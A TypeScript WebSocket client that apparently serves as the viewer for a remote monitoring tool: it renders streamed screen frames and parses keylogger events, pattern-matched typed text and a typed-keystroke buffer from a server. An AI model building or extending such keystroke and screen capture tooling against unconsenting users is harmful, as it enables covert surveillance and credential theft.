import { Command, StreamStats, ConnectionStatus, PatternMatch } from './Protocol';

type Config = {
  onFrame: (bitmap: ImageBitmap) => void;
  onLog: (msg: string) => void;
  onStats: (stats: StreamStats) => void;
  onStatusChange: (status: ConnectionStatus) => void;
  onKeyEvent?: (key: string, code: number) => void;
  onPatternMatch?: (match: PatternMatch) => void;
  onTypedBuffer?: (buffer: string) => void;
};

export class StreamClient {
  private ws: WebSocket | null = null;
  private stats: StreamStats = { fps: 0, frameCount: 0, totalBytes: 0 };
  private lastFrameTime = 0;
  private config: Config;
  
  constructor(config: Config) {
    this.config = config;
  }

  // Update callbacks without reconnecting
  updateConfig(newConfig: Partial<Config>) {
    this.config = { ...this.config, ...newConfig };
  }

  isConnected(): boolean {
    return this.ws?.readyState === WebSocket.OPEN;
  }
  
  connect(url: string): Promise<void> {
      return new Promise((resolve, reject) => {
          if (this.ws?.readyState === WebSocket.OPEN) {
              resolve();
              return;
          }
          
          this.config.onLog(`🔄 Connecting to ${url}...`);
          this.config.onStatusChange('CONNECTING');
          
          this.ws = new WebSocket(url);
          this.ws.binaryType = "arraybuffer";

          this.ws.onopen = () => {
              this.config.onLog("✅ Connected");
              this.config.onStatusChange('CONNECTED');
              this.resetStats();
              resolve();
          };

          this.ws.onerror = (error) => {
              reject(error);
          };

          this.ws.onclose = (e) => {
              this.config.onLog(`🔌 Disconnected: ${e.code}`);
              this.config.onStatusChange('DISCONNECTED');
          };

          this.ws.onmessage = async (e) => this.handleMessage(e);
      });
  }

  disconnect() {
    this.ws?.close();
  }

  sendCommand(cmd: Command | string) {
    if (this.ws?.readyState === WebSocket.OPEN) {
      this.ws.send(cmd);
      this.config.onLog(`📤 Sent: ${cmd}`);
    } else {
      this.config.onLog("⚠️ Not connected");
    }
  }

  private async handleMessage(event: MessageEvent) {
    if (typeof event.data === "string") {
      const data = event.data as string;
      
      // Handle keylogger events specially
      if (data.startsWith("KEY:")) {
        const match = data.match(/KEY:(\w+) \((\d+)\)/);
        if (match && this.config.onKeyEvent) {
          this.config.onKeyEvent(match[1], parseInt(match[2]));
        }
        return;
      }
      
      // Handle pattern match events
      if (data.startsWith("PATTERN:")) {
        const parts = data.substring(8).split(':');
        if (parts.length >= 2 && this.config.onPatternMatch) {
          this.config.onPatternMatch({
            patternName: parts[0],
            matchedText: parts.slice(1).join(':')
          });
        }
        return;
      }
      
      // Handle typed buffer response
      if (data.startsWith("BUFFER:")) {
        if (this.config.onTypedBuffer) {
          this.config.onTypedBuffer(data.substring(7));
        }
        return;
      }
      
      this.config.onLog(`📩 Server: ${data}`);
      return;
    }

    // Binary Handling (Performance Optimized)
    const buffer = event.data as ArrayBuffer;
    this.updateStats(buffer.byteLength);
    
    try {
      const bitmap = await createImageBitmap(new Blob([buffer]));
      this.config.onFrame(bitmap);
    } catch (err) {
      this.config.onLog("❌ Error decoding frame");
    }
  }

  private updateStats(byteLength: number) {
    const now = performance.now();
    if (this.lastFrameTime > 0) {
      const diff = (now - this.lastFrameTime) / 1000;
      this.stats.fps = Math.round(1 / diff);
    }
    this.lastFrameTime = now;
    this.stats.frameCount++;
    this.stats.totalBytes += byteLength;
    this.config.onStats(this.stats);
  }

  private resetStats() {
    this.stats = { fps: 0, frameCount: 0, totalBytes: 0 };
    this.lastFrameTime = 0;
  }
}